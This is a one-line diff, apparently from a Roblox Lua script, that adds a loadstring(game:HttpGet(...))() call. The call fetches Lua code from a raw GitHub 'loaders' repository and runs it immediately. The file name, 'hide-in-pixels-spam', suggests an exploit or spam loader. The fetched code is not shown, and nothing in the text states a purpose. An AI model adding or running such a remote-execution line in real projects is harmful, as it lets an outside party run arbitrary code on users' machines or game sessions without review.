@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/hide-in-pixels-spam5-5bf5wtgbi8troz.lua"))()
